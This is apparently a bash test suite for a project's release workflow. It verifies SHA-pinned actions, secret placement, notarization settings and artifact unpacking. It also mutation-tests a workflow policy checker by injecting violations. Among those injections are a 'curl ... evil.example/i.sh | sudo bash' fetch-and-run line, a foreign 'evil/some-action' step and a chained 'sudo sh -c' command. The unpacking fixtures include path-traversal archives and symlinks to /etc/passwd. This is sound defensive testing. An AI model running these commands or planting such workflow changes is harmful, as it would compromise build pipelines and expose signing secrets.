#!/usr/bin/env bash
# Policy tests for the release pipeline that need no secrets, minisign or network, and run on
# macOS and Linux:
#   - resolve-release-tag.sh: the run must be ON its tag; --is-prerelease covers ANY semver
#     prerelease (a semver prerelease part marks the GitHub release as a prerelease)
#   - install.sh version_lt (the MIN_RELEASE floor comparison) under sh and dash
#   - SHA-pinned actions with version comments in all workflows; release.yml structure: no `inputs.tag ||` checkout ref,
#     persist-credentials: false on every checkout, build jobs gated on preflight
#   - macOS notarization: App Store Connect API key only (no personal Apple password)
#   - job graph / secret placement over ALL workflows (scripts/check-workflow-policy.rb, mutation-tested):
#     no secret or environment in any job that runs dependency code; sign-macos is a fresh-runner job
#     that installs nothing; artifact names; preflight on-main + not-published checks
#   - the helper scripts behind those jobs, exercised for real (pack/unpack, collect, on-main, published)
set -uo pipefail

ROOT="$(cd "$(dirname "$0")/.." && pwd)"
RESOLVE="$ROOT/scripts/resolve-release-tag.sh"
WF="$ROOT/.github/workflows/release.yml"
FAILS=0
pass() { echo "PASS $1"; }
fail() { echo "FAIL $1"; FAILS=$((FAILS + 1)); }
check() { local n="$1"; shift; if "$@" >/dev/null 2>&1; then pass "$n"; else fail "$n"; fi; }
check_not() { local n="$1"; shift; if "$@" >/dev/null 2>&1; then fail "$n"; else pass "$n"; fi; }

# ── resolve-release-tag.sh (release runs only ON its own tag)
rt() { env -i PATH="$PATH" "$@" bash "$RESOLVE"; }
check resolve_tag_push rt GITHUB_REF=refs/tags/v1.0.0
check resolve_dispatch_on_tag rt GITHUB_REF=refs/tags/v1.0.0 INPUT_TAG=v1.0.0
check_not resolve_dispatch_other_tag rt GITHUB_REF=refs/tags/v1.0.0 INPUT_TAG=v1.0.1
check_not resolve_dispatch_branch_name rt GITHUB_REF=refs/tags/v1.0.0 INPUT_TAG=main
check_not resolve_dispatch_sha rt GITHUB_REF=refs/tags/v1.0.0 INPUT_TAG=0123456789abcdef0123456789abcdef01234567
check_not resolve_branch_ref_no_input rt GITHUB_REF=refs/heads/main
check_not resolve_branch_ref_with_tag rt GITHUB_REF=refs/heads/main INPUT_TAG=v1.0.0
check_not resolve_malformed_tag rt GITHUB_REF=refs/tags/v1.0 INPUT_TAG=
if [ "$(rt GITHUB_REF=refs/tags/v1.0.0 INPUT_TAG=main 2>/dev/null; echo "rc=$?")" = "rc=1" ]; then pass resolve_main_exit_code_1; else fail resolve_main_exit_code_1; fi

# ── --is-prerelease (a semver prerelease part marks the GitHub release as a prerelease)
isp() { bash "$RESOLVE" --is-prerelease "$1"; }
for t in v1.0.0-dev.1 v1.0.0-pre v1.0.0-beta v1.0.0-beta.2 v1.0.0-rc.1 v1.0.0-alpha v0.0.3-beta v1.0.0-x+build.5; do
  check "prerelease_true_$t" isp "$t"
done
for t in v1.0.0 v0.4.12 v1.0.0+build-meta; do
  check_not "prerelease_false_$t" isp "$t"
done

# ── version_lt from install.sh (a replayed older signed release is refused below MIN_RELEASE)
VL="$(mktemp)"; trap 'rm -f "$VL"' EXIT
sed -n '/^version_lt() {/,/^}/p' "$ROOT/scripts/install.sh" >"$VL"
[ -s "$VL" ] || fail extract_version_lt
SHELLS="/bin/sh"
command -v dash >/dev/null 2>&1 && SHELLS="$SHELLS $(command -v dash)"
vl() { # <expect: lt|ge> <a> <b>
  local want="$1" a="$2" b="$3" sh_bin got
  for sh_bin in $SHELLS; do
    if "$sh_bin" -c ". '$VL'; version_lt '$a' '$b'" >/dev/null 2>&1; then got=lt; else got=ge; fi
    if [ "$got" = "$want" ]; then pass "version_lt $a $b = $want [$(basename "$sh_bin")]"
    else fail "version_lt $a $b: want $want got $got [$(basename "$sh_bin")]"; fi
  done
}
vl lt v9.9.7 v9.9.8
vl ge v9.9.8 v9.9.8
vl ge v9.9.9 v9.9.8
vl lt v0.9.9 v1.0.0
vl ge v1.0.0 v0.9.9
vl lt v1.2.3 v1.10.0
vl ge v1.10.0 v1.2.3
vl lt v0.0.3-beta v0.0.3
vl ge v0.0.3 v0.0.3-beta
vl ge v0.0.3-beta v0.0.3-beta
vl ge v0.0.4-beta v0.0.3
vl lt v0.0.2 v0.0.3-beta
vl ge v0.0.3+build.1 v0.0.3

# ── release.yml structure (runs only ON its tag; no checkout persists credentials; build jobs wait for preflight)
# the pre-checkout ref validation is inlined in every job (it runs before any repo code), so the
# tag regex must be byte-identical across all copies and resolve-release-tag.sh
REGEXES="$( { grep -h -o "grep -Eq '^v[^']*'" "$WF"; grep -h -o "grep -Eq '^v[^']*'" "$RESOLVE" | grep -F '[-+]'; } || true)"
NRE="$(printf '%s\n' "$REGEXES" | grep -c . || true)"
NSTEPS="$(grep -c 'Validate release ref (before any repo code runs)' "$WF")"
NDISTINCT="$(printf '%s\n' "$REGEXES" | sort -u | grep -c . || true)"
if [ "$NDISTINCT" = 1 ] && [ "$NRE" = $((NSTEPS + 1)) ] && [ "$NSTEPS" -ge 1 ]; then pass "wf_ref_regex_copies_identical ($NSTEPS steps + resolve script)"; else fail "wf_ref_regex_copies_identical (steps=$NSTEPS regexes=$NRE distinct=$NDISTINCT)"; fi
check_not wf_no_inputs_tag_checkout_ref grep -n 'inputs.tag ||' "$WF"
# every `uses:` in EVERY workflow is pinned to a 40-hex SHA with a `# version` comment (local `./` actions excluded)
UNPINNED="$(grep -HnE '^[[:space:]]*-?[[:space:]]*uses:' "$ROOT"/.github/workflows/*.yml | grep -vE 'uses:[[:space:]]+\./' | grep -vE 'uses:[[:space:]]+[A-Za-z0-9_.-]+/[A-Za-z0-9_./-]+@[0-9a-f]{40}[[:space:]]+#[[:space:]]*[^[:space:]].*$' || true)"
if [ -z "$UNPINNED" ]; then pass wf_all_actions_sha_pinned; else fail wf_all_actions_sha_pinned; echo "$UNPINNED" | sed 's/^/    | /'; fi
NCHK="$(grep -c 'uses: actions/checkout@' "$WF")"
NPC="$(grep -c 'persist-credentials: false' "$WF")"
if [ "$NCHK" -ge 1 ] && [ "$NCHK" = "$NPC" ]; then pass "wf_checkouts_persist_credentials_false ($NCHK)"; else fail "wf_checkouts_persist_credentials_false (checkouts=$NCHK persist=$NPC)"; fi
check wf_build_cli_needs_preflight bash -c "awk '/^  build-cli:/{f=1;next} /^  [a-z-]+:/{f=0} f' '$WF' | grep -qE '^    needs: \\[?preflight'"
check wf_build_desktop_needs_preflight bash -c "awk '/^  build-desktop:/{f=1;next} /^  [a-z-]+:/{f=0} f' '$WF' | grep -qE '^    needs: \\[?preflight'"
# the OIDC token scope lives only in the attest job; the manifest-signing job has no write scope
check wf_id_token_only_in_attest bash -c "[ \"\$(grep -c 'id-token: write' '$WF')\" = 1 ] && awk '/^  attest-provenance:/{f=1;next} /^  [a-z-]+:/{f=0} f' '$WF' | grep -q 'id-token: write'"

# ── macOS notarization uses an App Store Connect API key, never an Apple ID password
SIGN="$ROOT/scripts/macos-ci-sign.sh"
EXPORT="$ROOT/scripts/macos-export-signing-secrets.sh"
check_not wf_no_apple_id_secret grep -nE 'secrets\.APPLE_(ID|PASSWORD)' "$WF"
check_not sign_no_apple_id grep -nE 'APPLE_(ID|PASSWORD)' "$SIGN"
check_not export_no_apple_id grep -nE 'APPLE_(ID|PASSWORD)' "$EXPORT"
check sign_notarytool_api_key bash -c "grep -qF -- '--key-id \"\$APPLE_API_KEY_ID\"' '$SIGN' && grep -qF -- '--issuer \"\$APPLE_API_ISSUER\"' '$SIGN' && grep -qF -- '--key \"\$key\"' '$SIGN' && ! grep -qF -- '--apple-id' '$SIGN'"
check sign_p8_temp_file bash -c "grep -qF 'umask 077' '$SIGN' && grep -qF 'RUNNER_TEMP' '$SIGN' && grep -qF 'trap cleanup_notary_key EXIT' '$SIGN'"
check export_sets_api_key bash -c "grep -qF 'setsecret APPLE_API_KEY_P8' '$EXPORT' && grep -qF 'setsecret APPLE_API_KEY_ID' '$EXPORT' && grep -qF 'setsecret APPLE_API_ISSUER' '$EXPORT'"
check sign_has_app_sign_notarize bash -c "grep -qF 'app-sign)' '$SIGN' && grep -qF 'app-notarize)' '$SIGN' && grep -qF 'stapler staple \"\$app\"' '$SIGN'"

# ── job graph and secret placement (all workflows) via scripts/check-workflow-policy.rb
POLICY="$ROOT/scripts/check-workflow-policy.rb"
check_not wf_no_apple_api_key_path grep -nE '^[[:space:]]*APPLE_API_KEY_PATH' "$WF"
if command -v ruby >/dev/null 2>&1; then
  OUTP="$(ruby "$POLICY" "$ROOT"/.github/workflows/*.yml 2>&1)"; RCP=$?
  if [ "$RCP" = 0 ]; then pass wf_policy_all_workflows; else fail wf_policy_all_workflows; echo "$OUTP" | sed 's/^/    | /'; fi
else
  fail "wf_policy_all_workflows (ruby not found)"
fi
# the export-secrets regression test (F06) and the policy tests themselves run in the macOS CI job
check ci_runs_export_signing_secrets_test grep -qF 'bash scripts/test-export-signing-secrets.sh' "$ROOT/.github/workflows/rust-ci.yml"
check sign_notary_waits_are_bounded bash -c "grep -qF -- '--timeout \"\$NOTARY_WAIT\"' '$SIGN' && grep -qF -- '--no-wait' '$SIGN' && grep -qF -- '-lut 7200' '$SIGN'"
check sign_notary_steps_have_timeout bash -c "grep -c 'timeout-minutes: 30' '$WF' | grep -qE '^[3-9]'"

# the policy must not pass vacuously when given nothing to check
check_not wf_policy_requires_files ruby "$POLICY"

# Mutation tests: each injected violation MUST make the policy fail (so the policy is not vacuous).
MW="$(mktemp -d)"; trap 'rm -f "$VL"; rm -rf "$MW"' EXIT
mut() { # <name> <file> <old> <new>   -> $MW/<name>/<file> with the first <old> replaced; policy must FAIL
  local name="$1" file="$2" old="$3" new="$4"
  mkdir -p "$MW/$name"
  if ! python3 - "$ROOT/.github/workflows/$file" "$MW/$name/$file" "$old" "$new" <<'PY'
import sys
src,dst,old,new=sys.argv[1:5]
s=open(src).read()
if old not in s: sys.exit(3)
open(dst,'w').write(s.replace(old,new,1))
PY
  then fail "mutation_$name (pattern not found: mutation test is stale)"; return; fi
  [ -n "${SHOW_MUT:-}" ] && ruby "$POLICY" "$MW/$name/$file" 2>&1 | sed "s/^/  [$name] /" | head -3
  if ruby "$POLICY" "$MW/$name/$file" >/dev/null 2>&1; then fail "mutation_$name (policy still passes)"; else pass "mutation_$name caught"; fi
}
if command -v ruby >/dev/null 2>&1; then
  mut secret_in_dep_step_env release.yml $'        run: pnpm install --frozen-lockfile\n\n      # ── Web UI' $'        env:\n          X: ${{ secrets.APPLE_API_KEY_P8 }}\n        run: pnpm install --frozen-lockfile\n\n      # ── Web UI'
  mut secret_in_build_job_env release.yml $'    needs: preflight\n    timeout-minutes: 90\n    strategy:' $'    needs: preflight\n    timeout-minutes: 90\n    env:\n      X: ${{ secrets.APPLE_CERTIFICATE }}\n    strategy:'
  mut secret_in_workflow_env release.yml $'concurrency:\n  group: release' $'env:\n  X: ${{ secrets.MINISIGN_PASSWORD }}\n\nconcurrency:\n  group: release'
  mut env_on_build_desktop release.yml $'    name: Build Desktop (${{ matrix.target }})\n    needs: preflight' $'    name: Build Desktop (${{ matrix.target }})\n    environment: release-signing\n    needs: preflight'
  mut secret_in_run_body release.yml $'        run: bash scripts/macos-ci-sign.sh detect' $'        run: echo ${{ secrets.APPLE_CERTIFICATE }} && bash scripts/macos-ci-sign.sh detect'
  mut secrets_inherit release.yml $'permissions:\n  contents: read\n' $'permissions:\n  contents: read\n# secrets: inherit\n'
  mut detect_gets_real_secret release.yml $'APPLE_CERTIFICATE: ${{ secrets.APPLE_CERTIFICATE != \'\' && \'present\' || \'\' }}' $'APPLE_CERTIFICATE: ${{ secrets.APPLE_CERTIFICATE }}'
  mut import_step_widened release.yml $'          APPLE_CERTIFICATE_PASSWORD: ${{ secrets.APPLE_CERTIFICATE_PASSWORD }}\n        run: bash scripts/macos-ci-sign.sh keychain-setup' $'          APPLE_CERTIFICATE_PASSWORD: ${{ secrets.APPLE_CERTIFICATE_PASSWORD }}\n          APPLE_API_KEY_P8: ${{ secrets.APPLE_API_KEY_P8 }}\n        run: bash scripts/macos-ci-sign.sh keychain-setup'
  mut sign_macos_installs_deps release.yml $'      - name: Assert checkout is the tagged commit' $'      - name: Install deps\n        run: pnpm install\n\n      - name: Assert checkout is the tagged commit'
  mut sign_macos_runs_foreign_action release.yml $'      - name: Assert checkout is the tagged commit' $'      - name: Foreign\n        uses: tauri-apps/tauri-action@84b9d35b5fc46c1e45415bdb6144030364f7ebc5 # v0.6.2\n\n      - name: Assert checkout is the tagged commit'
  mut recompress_after_dmg_sign release.yml '      - name: Recompress dmg (lzma)' '      - name: Zzz Recompress dmg (lzma)'
  mut no_job_timeout release.yml $'    needs: sign-manifest\n    runs-on: ubuntu-latest\n    timeout-minutes: 15' $'    needs: sign-manifest\n    runs-on: ubuntu-latest'
  mut flattening_download release.yml $'          pattern: cli-*' $'          name: cli-aarch64-apple-darwin'
  mut no_ancestry_check release.yml 'check-commit-on-main.sh' 'echo-commit-on-main.sh'
  mut publish_without_guard release.yml $'        run: bash scripts/check-release-not-published.sh "$TAG"\n\n      # The preinstalled' $'        run: "true"\n\n      # The preinstalled'
  mut macos_build_uploads_final_name release.yml $'      - name: Upload CLI artifact\n        if: runner.os != \'macOS\'' $'      - name: Upload CLI artifact\n        if: runner.os != \'Windows\''
  mut publish_uses_signing_env release.yml 'environment: release-publish' 'environment: release-signing'
  # the ten bypasses of the review (G01) plus the other privileged-job rules
  FA='uses: evil/some-action@0123456789abcdef0123456789abcdef01234567 # v1.0.0'
  mut foreign_action_in_sign_manifest release.yml $'      - name: Build manifest' $'      - name: Foreign\n        '"$FA"$'\n\n      - name: Build manifest'
  mut curl_pipe_in_sign_manifest release.yml '"$d/minisign-linux/x86_64/minisign" -v' 'curl -fsSL https://evil.example/i.sh | sudo bash'
  mut foreign_action_in_publish release.yml $'      - name: Create draft release and upload assets' $'      - name: Foreign\n        '"$FA"$'\n\n      - name: Create draft release and upload assets'
  mut publish_drops_attest_need release.yml 'needs: [sign-manifest, attest-provenance]' 'needs: [sign-manifest]'
  mut publish_job_if_always release.yml $'    needs: [sign-manifest, attest-provenance]\n' $'    needs: [sign-manifest, attest-provenance]\n    if: always()\n'
  mut sign_manifest_drops_smoke_need release.yml 'needs: [preflight, build-cli, build-desktop, sign-macos, smoke-cli-macos]' 'needs: [preflight, build-cli, build-desktop, sign-macos]'
  mut continue_on_error_on_verify release.yml $'        run: bash scripts/macos-verify-signed.sh bundle' $'        continue-on-error: true\n        run: bash scripts/macos-verify-signed.sh bundle'
  mut python_step_in_sign_macos release.yml $'      - name: Assert checkout is the tagged commit' $'      - name: Net\n        run: python3 -c "import urllib.request"\n\n      - name: Assert checkout is the tagged commit'
  mut chained_command_in_keychain_step release.yml 'run: bash scripts/macos-ci-sign.sh keychain-setup' 'run: bash scripts/macos-ci-sign.sh keychain-setup; sudo sh -c "$EXTRA"'
  mut artifact_executed_in_sign_step release.yml $'          W="$RUNNER_TEMP/work/cli"\n          bash scripts/macos-ci-sign.sh sign ' $'          W="$RUNNER_TEMP/work/cli"\n          "$W/vst" --version\n          bash scripts/macos-ci-sign.sh sign '
  mut apt_install_back_in_sign_manifest release.yml '          set -euo pipefail
          d="$RUNNER_TEMP/minisign"' '          set -euo pipefail
          sudo apt-get install -y minisign
          d="$RUNNER_TEMP/minisign"'
  mut minisign_pin_changed release.yml 'f0a0954413df8531befed169e447a66da6868d79052ed7e892e50a4291af7ae0' '0000000000000000000000000000000000000000000000000000000000000000'
  mut unsigned_retention_one_day release.yml 'retention-days: 7' 'retention-days: 1'
  mut publish_drops_verify_tag release.yml 'args=(--draft --verify-tag --title "Release $TAG")' 'args=(--draft --title "Release $TAG")'
  mut step_if_always_outside_cleanup release.yml $'      - name: Build manifest\n' $'      - name: Build manifest\n        if: always()\n'
  mut validate_step_body_altered release.yml $'          tag="${INPUT_TAG:-${REF#refs/tags/}}"\n          printf' $'          tag="${INPUT_TAG:-${REF#refs/tags/}}"; true\n          printf'
  mut persist_credentials_rust_ci rust-ci.yml $'        with:\n          persist-credentials: false' $'        with:\n          fetch-depth: 1'
  mut no_permissions_desktop desktop-build.yml $'permissions:\n  contents: read\n' $'permissions:\n  contents: write\n'
  mut write_in_dep_job desktop-build.yml $'    timeout-minutes: 90\n' $'    timeout-minutes: 90\n    permissions:\n      contents: write\n'
fi

# ── helper scripts, exercised for real (portable: bash 3.2 / BSD userland ok)
T="$(mktemp -d)"; trap 'rm -f "$VL"; rm -rf "$MW" "$T"' EXIT
PACK="$ROOT/scripts/macos-pack-unsigned.sh"; UNPACK="$ROOT/scripts/macos-unpack-unsigned.sh"
printf a >"$T/vst"; printf b >"$T/c1"; printf c >"$T/c2"; chmod +x "$T/vst" "$T/c1" "$T/c2"
check pack_unpack_cli_roundtrip bash -c "bash '$PACK' cli '$T/p1' '$T/vst' '$T/c1' '$T/c2' && bash '$UNPACK' cli '$T/p1' '$T/u1' && [ -x '$T/u1/vst' ] && [ -x '$T/u1/codex-acp' ]"
mkdir -p "$T/X.app/Contents/MacOS"; echo z >"$T/X.app/Contents/MacOS/x"; echo d >"$T/a.dmg"
check pack_unpack_desktop_roundtrip bash -c "bash '$PACK' desktop '$T/p2' '$T/X.app' '$T/a.dmg' && bash '$UNPACK' desktop '$T/p2' '$T/u2' && [ -d '$T/u2/app/X.app/Contents' ] && [ -f '$T/u2/unsigned.dmg' ]"
cp -R "$T/p1" "$T/p1x"; echo junk >"$T/p1x/extra"
check_not unpack_rejects_extra_file bash "$UNPACK" cli "$T/p1x" "$T/u3"
cp -R "$T/p1" "$T/p1y"; printf 'tampered' >>"$T/p1y/unsigned-cli.tar"
check_not unpack_rejects_hash_mismatch bash "$UNPACK" cli "$T/p1y" "$T/u4"
# a tar with a path-traversal member must be refused even with a matching manifest
mkdir -p "$T/evil/sub"; echo e >"$T/evil/e"; ( cd "$T/evil/sub" && tar -cf ../unsigned-cli.tar ../e vst 2>/dev/null || tar -cf ../unsigned-cli.tar ../e )
mkdir -p "$T/p5"; cp "$T/evil/unsigned-cli.tar" "$T/p5/"
( cd "$T/p5" && if command -v sha256sum >/dev/null 2>&1; then sha256sum unsigned-cli.tar; else shasum -a 256 unsigned-cli.tar; fi ) >"$T/p5/MANIFEST.sha256"
check_not unpack_rejects_dotdot_member bash "$UNPACK" cli "$T/p5" "$T/u5"
# a desktop tar with two top-level dirs
mkdir -p "$T/two/A.app/Contents" "$T/two/B.app/Contents"; ( cd "$T/two" && tar -cf "$T/p6.tar" A.app B.app )
mkdir -p "$T/p6"; cp "$T/p6.tar" "$T/p6/unsigned-app.tar"; echo d >"$T/p6/unsigned.dmg"
( cd "$T/p6" && for f in unsigned-app.tar unsigned.dmg; do if command -v sha256sum >/dev/null 2>&1; then sha256sum $f; else shasum -a 256 $f; fi; done ) >"$T/p6/MANIFEST.sha256"
check_not unpack_rejects_two_apps bash "$UNPACK" desktop "$T/p6" "$T/u6"

# macos-unpack-unsigned.sh: member types, symlinks that leave the bundle, hardlinks, modes
export COPYFILE_DISABLE=1
shaline() { if command -v sha256sum >/dev/null 2>&1; then sha256sum "$1"; else shasum -a 256 "$1"; fi; }
desk() { # <name> <dir holding the app>  -> artifact dir $T/<name> (tar of its single *.app + matching manifest)
  local n="$1" src="$2"
  mkdir -p "$T/$n"; ( cd "$src" && tar -cf "$T/$n/unsigned-app.tar" *.app ); echo d >"$T/$n/unsigned.dmg"
  ( cd "$T/$n" && for f in unsigned-app.tar unsigned.dmg; do shaline "$f"; done ) >"$T/$n/MANIFEST.sha256"
}
mkapp() { rm -rf "${T:?}/$1"; mkdir -p "$T/$1/H.app/Contents/MacOS"; echo z >"$T/$1/H.app/Contents/MacOS/h"; }
mkapp s1; rm -rf "$T/s1/H.app/Contents"; ln -s /Applications/Safari.app/Contents "$T/s1/H.app/Contents"; desk ds1 "$T/s1"
check_not unpack_rejects_symlinked_contents bash "$UNPACK" desktop "$T/ds1" "$T/us1"
mkapp s2; ln -s /etc/passwd "$T/s2/H.app/Contents/leak"; desk ds2 "$T/s2"
check_not unpack_rejects_absolute_symlink bash "$UNPACK" desktop "$T/ds2" "$T/us2"
mkapp s3; ln -s ../../../outside "$T/s3/H.app/Contents/leak"; desk ds3 "$T/s3"
check_not unpack_rejects_symlink_escaping_bundle bash "$UNPACK" desktop "$T/ds3" "$T/us3"
mkapp s4; ln -s ../MacOS/h "$T/s4/H.app/Contents/ok-link"; desk ds4 "$T/s4"
check unpack_allows_symlink_inside_bundle bash "$UNPACK" desktop "$T/ds4" "$T/us4"
mkapp s5; ln "$T/s5/H.app/Contents/MacOS/h" "$T/s5/H.app/Contents/MacOS/h2"; desk ds5 "$T/s5"
check_not unpack_rejects_hardlink_member bash "$UNPACK" desktop "$T/ds5" "$T/us5"
mkapp s6; chmod 6777 "$T/s6/H.app/Contents/MacOS/h"; desk ds6 "$T/s6"
check unpack_masks_setuid_and_group_world_write bash -c "bash '$UNPACK' desktop '$T/ds6' '$T/us6' && [ -z \"\$(find '$T/us6' \\( -perm -4000 -o -perm -2000 -o -perm -0020 -o -perm -0002 \\) -print -quit)\" ]"
mkdir -p "$T/ch"; printf a >"$T/ch/vst"; ln "$T/ch/vst" "$T/ch/claude-acp"; printf c >"$T/ch/codex-acp"
mkdir -p "$T/pc2"; ( cd "$T/ch" && tar -cf "$T/pc2/unsigned-cli.tar" vst claude-acp codex-acp ); ( cd "$T/pc2" && shaline unsigned-cli.tar >MANIFEST.sha256 )
check_not unpack_rejects_cli_hardlink_member bash "$UNPACK" cli "$T/pc2" "$T/uc2"

# macos-repack-dmg.sh / macos-dmg-layout.sh: exactly one .app, nothing executable outside it (macOS only)
if [ "$(uname -s)" = Darwin ] && command -v hdiutil >/dev/null 2>&1 && command -v codesign >/dev/null 2>&1; then
  REPACK="$ROOT/scripts/macos-repack-dmg.sh"
  mkdmgapp() { # <dir> <Name.app> : minimal ad-hoc signed bundle
    mkdir -p "$1/$2/Contents/MacOS"; cp /usr/bin/true "$1/$2/Contents/MacOS/x"
    printf '<?xml version="1.0" encoding="UTF-8"?><plist version="1.0"><dict><key>CFBundleExecutable</key><string>x</string><key>CFBundleIdentifier</key><string>test.%s</string><key>CFBundlePackageType</key><string>APPL</string></dict></plist>\n' "${2%.app}" >"$1/$2/Contents/Info.plist"
    codesign --force -s - "$1/$2" >/dev/null 2>&1
  }
  mkdmg() { hdiutil create -quiet -fs HFS+ -volname VstTest -srcfolder "$1" -format UDZO -ov "$2" >/dev/null 2>&1; }
  mkdmgapp "$T/signed" H.app
  # happy path: one app + Applications link + .background
  mkdir -p "$T/d-ok/.background"; mkdmgapp "$T/d-ok" H.app; ln -s /Applications "$T/d-ok/Applications"; echo png >"$T/d-ok/.background/bg.png"
  if mkdmg "$T/d-ok" "$T/ok.dmg"; then
    check repack_accepts_single_app_layout bash "$REPACK" "$T/ok.dmg" "$T/signed/H.app"
    mkdir -p "$T/d-two"; mkdmgapp "$T/d-two" H.app; mkdmgapp "$T/d-two" B.app
    mkdmg "$T/d-two" "$T/two.dmg"; check_not repack_rejects_two_apps bash "$REPACK" "$T/two.dmg" "$T/signed/H.app"
    mkdir -p "$T/d-cmd"; mkdmgapp "$T/d-cmd" H.app; printf '#!/bin/sh\necho hi\n' >"$T/d-cmd/run.command"; chmod +x "$T/d-cmd/run.command"
    mkdmg "$T/d-cmd" "$T/cmd.dmg"; check_not repack_rejects_executable_outside_app bash "$REPACK" "$T/cmd.dmg" "$T/signed/H.app"
    mkdir -p "$T/d-lnk"; mkdmgapp "$T/d-lnk" H.app; ln -s /etc "$T/d-lnk/Applications"
    mkdmg "$T/d-lnk" "$T/lnk.dmg"; check_not repack_rejects_redirected_applications_link bash "$REPACK" "$T/lnk.dmg" "$T/signed/H.app"
    mkdir -p "$T/d-name"; mkdmgapp "$T/d-name" Other.app
    mkdmg "$T/d-name" "$T/name.dmg"; check_not repack_rejects_app_name_mismatch bash "$REPACK" "$T/name.dmg" "$T/signed/H.app"
  else
    echo "SKIP repack tests (hdiutil create unavailable here)"
  fi
fi

# collect-release-assets.sh: explicit mapping, exactly-once, nothing unexpected, sha256 verified
COLLECT="$ROOT/scripts/collect-release-assets.sh"
shaf() { if command -v sha256sum >/dev/null 2>&1; then sha256sum "$1" | cut -d' ' -f1; else shasum -a 256 "$1" | cut -d' ' -f1; fi; }
mkart() { # <dir> <artifact> <asset>...
  local d="$1" a="$2"; shift 2; mkdir -p "$d/$a"
  for f in "$@"; do printf 'content-%s' "$f" >"$d/$a/$f"; shaf "$d/$a/$f" >"$d/$a/$f.sha256"; done
}
mkall() { # <dir>
  mkart "$1" cli-x86_64-unknown-linux-musl vst-x86_64-unknown-linux-musl.tar.gz
  mkart "$1" cli-aarch64-unknown-linux-musl vst-aarch64-unknown-linux-musl.tar.gz
  mkart "$1" cli-aarch64-apple-darwin vst-aarch64-apple-darwin.tar.gz
  mkart "$1" desktop-x86_64-unknown-linux-gnu vibe-station-x86_64-unknown-linux-gnu.AppImage vibe-station-x86_64-unknown-linux-gnu.deb
  mkart "$1" desktop-aarch64-apple-darwin vibe-station-aarch64-apple-darwin.dmg
}
mkall "$T/c-ok"
check collect_ok bash "$COLLECT" "$T/c-ok" "$T/c-ok-out"
[ "$(ls "$T/c-ok-out" 2>/dev/null | wc -l | tr -d ' ')" = 12 ] && pass collect_ok_12_files || fail collect_ok_12_files
mkall "$T/c-dup"; cp "$T/c-dup/desktop-aarch64-apple-darwin/vibe-station-aarch64-apple-darwin.dmg" "$T/c-dup/cli-x86_64-unknown-linux-musl/"
check_not collect_rejects_foreign_asset_in_other_artifact bash "$COLLECT" "$T/c-dup" "$T/c-dup-out"
mkall "$T/c-extra"; mkdir -p "$T/c-extra/desktop-evil"; echo x >"$T/c-extra/desktop-evil/f"
check_not collect_rejects_unexpected_artifact bash "$COLLECT" "$T/c-extra" "$T/c-extra-out"
mkall "$T/c-miss"; rm "$T/c-miss/cli-aarch64-apple-darwin/vst-aarch64-apple-darwin.tar.gz"
check_not collect_rejects_missing_asset bash "$COLLECT" "$T/c-miss" "$T/c-miss-out"
mkall "$T/c-sum"; echo 0000 >"$T/c-sum/desktop-x86_64-unknown-linux-gnu/vibe-station-x86_64-unknown-linux-gnu.deb.sha256"
check_not collect_rejects_bad_sha256 bash "$COLLECT" "$T/c-sum" "$T/c-sum-out"
mkall "$T/c-link"; rm "$T/c-link/cli-aarch64-apple-darwin/vst-aarch64-apple-darwin.tar.gz"; ln -s ../cli-x86_64-unknown-linux-musl/vst-x86_64-unknown-linux-musl.tar.gz "$T/c-link/cli-aarch64-apple-darwin/vst-aarch64-apple-darwin.tar.gz"
check_not collect_rejects_symlink bash "$COLLECT" "$T/c-link" "$T/c-link-out"

# check-commit-on-main.sh in a scratch repo
ONMAIN="$ROOT/scripts/check-commit-on-main.sh"
(
  set -e; cd "$T"; mkdir repo; cd repo; git init -q -b main . 2>/dev/null || { git init -q .; git checkout -q -b main; }
  git config user.email t@t; git config user.name t; git config commit.gpgsign false
  echo 1 >f; git add f; git commit -qm one; git rev-parse HEAD >../sha_main
  git checkout -q -b side; echo 2 >f; git commit -qam two; git rev-parse HEAD >../sha_side
  git checkout -q main
)
check commit_on_main_accepts_main_commit bash -c "cd '$T/repo' && bash '$ONMAIN' \"\$(cat '$T/sha_main')\" main"
check_not commit_on_main_rejects_unmerged_commit bash -c "cd '$T/repo' && bash '$ONMAIN' \"\$(cat '$T/sha_side')\" main"
check_not commit_on_main_fails_closed_without_main bash -c "cd '$T/repo' && bash '$ONMAIN' \"\$(cat '$T/sha_main')\" refs/remotes/origin/main"
check_not commit_on_main_rejects_non_sha bash -c "cd '$T/repo' && bash '$ONMAIN' HEAD main"

# check-release-not-published.sh with a fake gh
NOTPUB="$ROOT/scripts/check-release-not-published.sh"
mkdir -p "$T/bin"
cat >"$T/bin/gh" <<'GH'
#!/usr/bin/env bash
case "${FAKE_GH:-}" in
  published) echo false ;;
  draft) echo true ;;
  none) echo "release not found" >&2; exit 1 ;;
  *) echo "HTTP 502 bad gateway" >&2; exit 1 ;;
esac
GH
chmod +x "$T/bin/gh"
np() { env PATH="$T/bin:$PATH" GITHUB_REPOSITORY=o/r FAKE_GH="$1" bash "$NOTPUB" v1.0.0; }
check_not not_published_refuses_published np published
check not_published_allows_draft np draft
check not_published_allows_missing np none
check_not not_published_fails_closed_on_other_errors np error

[ "$FAILS" -eq 0 ] || { echo "$FAILS failure(s)"; exit 1; }
echo "all passed"
